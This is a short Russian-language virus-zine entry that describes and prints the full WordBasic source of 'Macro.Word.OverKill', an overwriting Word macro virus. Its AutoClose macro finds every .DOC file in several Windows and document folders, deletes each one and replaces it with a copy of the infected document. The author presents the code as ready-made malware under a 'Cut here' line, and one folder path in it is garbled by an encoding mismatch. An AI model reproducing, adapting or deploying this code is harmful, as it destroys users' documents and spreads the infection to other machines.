Macro.Word.OverKill
(c) by Duke/SMF

Имя вируса    : Macro.Word.OverKill
Автор         : Duke/SMF
Язык прогр.   : WordBasic
Дата создания : 07.02.99

  Этот macro-вирус является простым overwriting вирусом. Состоит из
единственного макроса AutoClose. При закрытии пораженного документа вирус
ищет по маске *.DOC файлы в каталогах C:\Мои документы, C:\WINDOWS,
C:\WIN95, C:\WINWORD (включая подкаталоги), удаляет их и записывает вместо
них активный документ.
  Тем и живет... (с) анекдот.

===== Cut here =====
Sub MAIN
'This is Macro.Word.OverKill (c) by Duke/SMF
FileFind .SearchPath = " C:\╠юш фюъєьхэЄ√; C:\WINWORD; C:\WINDOWS; C:\WIN95",
 .Name = "*.DOC" .SubDir = 1
size = CountFoundFiles()
If size >= 1 Then
        For count = 1 To size
        Kill FoundFileName$(count)
        CopyFile .FileName = FileName$(), .Directory = FoundFileName$(count)
        Next
End If
End Sub
